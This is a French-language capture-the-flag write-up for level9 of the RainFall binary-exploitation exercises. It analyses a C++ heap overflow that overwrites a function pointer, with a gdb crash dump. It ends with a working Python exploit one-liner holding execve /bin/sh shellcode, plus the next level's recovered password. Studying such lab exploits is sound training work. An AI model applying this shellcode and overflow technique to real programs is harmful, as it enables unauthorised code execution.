Dans ce niveau, on a ce qui s'apparente a du C++ compile.

On voit qu'il y a une classe `N` qui a une methode `operator+` et `operator-`, un pointeur sur fonction, un nombre et une chaine de charactere
A priori en terme de structure on a quelque chose comme cela:
```c
struct {
   int nb;// 4 bytes
   char annotation[100];// 4 bytes
   int (N::*func)(N&);   // 4 bytes
} N;                    // 108 bytes
```

```bash
[----------------------------------registers-----------------------------------]
EAX: 0x2d2d2d2d ('----')
EBX: 0x804ec20 ("----")
ECX: 0x2d2d2d2d ('----')
EDX: 0x804ec24 --> 0x0
ESI: 0xffffd144 --> 0xffffd2b9 ("/mnt/c/Users/Remi/Downloads/Rainfall_execs/level9")
EDI: 0xf7ffcb80 --> 0x0
EBP: 0xffffd088 --> 0xf7ffd020 --> 0xf7ffda40 --> 0x0
ESP: 0xffffd060 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:       push   ebp)
EIP: 0x8048682 (<main+142>:     mov    edx,DWORD PTR [eax])
EFLAGS: 0x10287 (CARRY PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048677 <main+131>:        call   0x804870e <_ZN1N13setAnnotationEPc>
   0x804867c <main+136>:        mov    eax,DWORD PTR [esp+0x10]
   0x8048680 <main+140>:        mov    eax,DWORD PTR [eax]
=> 0x8048682 <main+142>:        mov    edx,DWORD PTR [eax]
   0x8048684 <main+144>:        mov    eax,DWORD PTR [esp+0x14]
   0x8048688 <main+148>:        mov    DWORD PTR [esp+0x4],eax
   0x804868c <main+152>:        mov    eax,DWORD PTR [esp+0x10]
   0x8048690 <main+156>:        mov    DWORD PTR [esp],eax
[------------------------------------stack-------------------------------------]
0000| 0xffffd060 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0004| 0xffffd064 --> 0xffffd2eb ("aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz0000----")
0008| 0xffffd068 --> 0xf7fbf8e0 --> 0xf7b6dcc6 ("GLIBC_PRIVATE")
0012| 0xffffd06c --> 0x1
0016| 0xffffd070 --> 0x804ec20 ("----")
0020| 0xffffd074 --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
0024| 0xffffd078 --> 0x804ec20 ("----")
0028| 0xffffd07c --> 0x804ebb0 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:      push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x08048682 in main ()
gdb-peda$
```

Avec une entree de 108 characteres, on voit que le programme crash lorsqu'il essaie de faire un `mov edx, DWORD PTR [eax]`
C'est du au fait que lorsqu'on copie les 108 characteres de `argv[1]`, on ecrase le pointeur sur fonction de la classe 2.  
Ainsi on peut ecrire du shellcode dans `argv[1]` qui sera ensuite copie dans le buffer de la classe 2.  
Et ensuite a la fin de la chaine on met l'addresse de notre shellcode pour que le pointeur sur fonction pointe dessus.  
Il faut noter une chose aussi, c'est que l'addresse a mettre dans `edx` est un pointeur vers l'addresse de la fonction a executer.  
Ainsi on mets au bout l'addresse du debut du buffer, et au debut du buffer on mets l'addresse du shellcode qui se trouve juste apres.
Quelque chose du genre:
```
buffer:   [ADDR_SHELLCODE] [SHELLCODE] [...PLACEHOLDER...] [ADDR_FN]
bytes:            4             28        (108 - 28 - 4)       4
```

```bash
level9@RainFall:~$ ./level9 $(python -c 'sc_addr = "\x10\xa0\x04\x08"; sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"; print sc_addr + sc + "\x42"*(108-len(sc)-len(sc_addr)) + "\x0c\xa0\x04\x08"')
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```